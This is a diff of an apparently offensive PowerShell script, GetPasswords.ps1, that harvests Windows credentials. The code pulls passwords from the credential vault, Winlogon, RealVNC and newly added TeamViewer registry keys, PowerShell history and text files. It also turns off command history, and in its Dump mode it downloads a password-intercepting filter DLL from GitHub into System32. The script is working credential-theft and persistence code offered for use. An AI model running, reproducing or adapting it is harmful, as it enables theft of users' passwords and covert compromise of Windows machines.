@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.2
+   PS cmdlet Dev version: v1.0.3
 
 .DESCRIPTION
    -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
@@ -16,7 +16,7 @@
    That means that the user password can be intercepted and logged.
 
 .NOTES
-   -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
+   -GetPasswords [ Dump ] requires Administrator privileges to add reg keys.
    To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
    from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
    REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
@@ -36,7 +36,7 @@
    Search for creds in store\regedit\disk {txt\xml\logs} diferent locations
 
 .EXAMPLE
-   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
+   PS C:\> .\GetPasswords.ps1 -GetPasswords Enum -StartDir "$Env:USERPROFILE"
    Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir [ dir ]
 
 .EXAMPLE
@@ -69,7 +69,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
     If($GetPasswords -ieq "Enum"){
 
         Write-Host "Scanning credential store for creds!" -ForegroundColor Green
-        Start-Sleep -Seconds 1
+        Write-Host "------------------------------------";Start-Sleep -Seconds 1
         ## Dump local passwords from credential manager
         [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
         $vault = New-Object Windows.Security.Credentials.PasswordVault
@@ -80,59 +80,70 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
             write-host "[error] none credentials found under PasswordVault!" -ForegroundColor Red -BackgroundColor Black
         }
 
-        ## Checking Registry for winlogon credentials
+        ## Checking Registry for credentials
+        # TODO: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer /v PermanentPassword - SecurityPasswordAES - 
+        # https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
+
+        $TeamViewer = "HKLM:SOFTWARE" + "\WOW6432Node\TeamViewer" -Join ''
         $RawKKLMKey = "HKLM:\SOFTWARE\Microsoft\" + "Windows NT\CurrentVersion\Winlogon" -Join ''
-        $WinLogOnPass = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaulPassword
-        $WinLogOnName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).LastUsedUsername
-        $DefaultDName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaultDomainName
-        $RealVnc = $(Get-Itemproperty -path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -EA SilentlyContinue).password
+        $WinLogOnPass = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).DefaulPassword
+        $WinLogOnName = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).LastUsedUsername
+        $DefaultDName = (Get-Itemproperty -Path "$RawKKLMKey" -EA SilentlyContinue).DefaultDomainName
+        $TeamVieweKey = (Get-Itemproperty -Path "$TeamViewer" -EA SilentlyContinue).PermanentPassword
+        $RealVnccreds = (Get-Itemproperty -Path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -EA SilentlyContinue).password
+        $SearchTVAES = $(reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer /f SecurityPasswordAES /s)
+        If($SearchTVAES -Match 'search: 0'){$PasswordAES = ""} ## Make sure reg key is not empty
+        If(-not($TeamVieweKey)){$TeamVieweKey = ""} ## Make sure reg key is not empty
+        $ParseDataAE = $SearchTVAES -split(' ');$PasswordAES = $ParseDataAE[14]
 
         ## Build Output Table
         Write-Host "`nScanning registry for winlogon creds!" -ForegroundColor Green
         Write-Host "-------------------------------------";Start-Sleep -Seconds 1
-        Write-Host "Username    : $WinLogOnName"
-        Write-Host "DomainName  : $DefaultDName"
-        Write-Host "Password    : $WinLogOnPass"
-        Write-Host "RealVNC Pass: $RealVnc"
+        Write-Host "Username      : $WinLogOnName"
+        Write-Host "DomainName    : $DefaultDName"
+        Write-Host "Password      : $WinLogOnPass"
+        Write-Host "RealVNC       : $RealVnccreds"
+        Write-Host "TeamViewer    : $TeamVieweKey"
+        Write-Host "TeamViewerAES : $PasswordAES"
 
         ## Checking ConsoleHost_History for credentials
-        Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green;Start-Sleep -Seconds 1
+        Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green
+        Write-Host "-------------------------------------";Start-Sleep -Seconds 1
         $PSHistory = "$Env:APPDATA\Microsoft\Windows\" + "PowerShell\PSReadLine\ConsoleHost_History.txt" -Join ''
-        $Credentials = Get-Content -Path "$PSHistory"|
-            Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"
+        $Credentials = Get-Content -Path "$PSHistory" -ErrorAction SilentlyContinue|
+            findstr /I /C:"user:" /I /C:"pass:" /I /C:"username:" /I /C:"pwd:" /I /C:"passw:" /I /C:"password:" /I /C:"login:" /I /C:"logon:"
         If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned
             Write-Host "[error] None Credentials found under ConsoleHost_History!" -ForegroundColor Red -BackgroundColor Black
         }Else{## Credentials found
-            Write-Host "-------------------------------------"
             ForEach($token in $Credentials){# Loop in each string found
                 Write-Host "$token"
             }
         }
 
         ## List Stored Passwords {in Text\Xml\Log Files}
-        Write-Host "`nStartDirectory: $StartDir" -ForeGroundColor Yellow
+        Write-Host "`n:Directory: $StartDir" -ForeGroundColor Yellow
         Write-Host "Scanning txt\xml\log for stored creds!" -ForegroundColor Green
+        Write-Host "--------------------------------------";Start-Sleep -Seconds 1
         If(-not(Test-Path -Path "$StartDir")){## User Input directory not found
             Write-Host "[error] -StartDir '$StartDir' not found!" -ForegroundColor Red -BackGroundColor Black
         }Else{## -StartDir User Input directory found
 
-           ## Exclude from DataBase report { Folders } and Match only { txt|xml|log extensions }
+           ## Exclude from DataBase report { Folders } and Match only { txt|xml|log } extensions
            $dAtAbAsEList = Get-ChildItem -Path "$StartDir" -Recurse -EA SilentlyContinue -Force|Where-Object {
               $_.PSIsContainer -ieq $False -and $_.FullName -iMatch '.txt' -or $_.FullName -iMatch '.log' -or $_.FullName -iMatch '.xml'
            }|Select-Object -ExpandProperty FullName         
          
            ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
               Get-Content -Path "$Item" -EA SilentlyContinue -Force|
-              findstr /C:"user:" /C:"pass:" /C:"username:" /C:"pwd:" /C:"passw:" /C:"password:" /C:"login:" /C:"logon:" >> $Env:TMP\passwd.txt
+              findstr /I /C:"user:" /I /C:"pass:" /I /C:"username:" /I /C:"pwd:" /I /C:"passw:" /I /C:"password:" /I /C:"login:" /I /C:"logon:" >> $Env:TMP\passwd.txt
            }
 
            $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue|
-               findstr /C:"user:" /C:"pass:" /C:"username:" /C:"pwd:" /C:"passw:" /C:"password:" /C:"login:" /C:"logon:"|
+               findstr /I /C:"user:" /I /C:"pass:" /I /C:"username:" /I /C:"pwd:" /I /C:"passw:" /I /C:"password:" /I /C:"login:" /I /C:"logon:"|
                findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
            If($ChekCreds -ieq $null){## None credentials found
               Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
            }Else{## Credentials found
-              Write-Host "-------------------------------------"
               ForEach($token in $ChekCreds){# Loop in each string found
                   Write-Host "$token"
               }
@@ -150,7 +161,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
                 ## Download 0evilpwfilter.dll from my GitHub repository
                 If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
-                    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
+                    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
                 }
 
                 ## Make sure the downloaded DLL its not corrupted
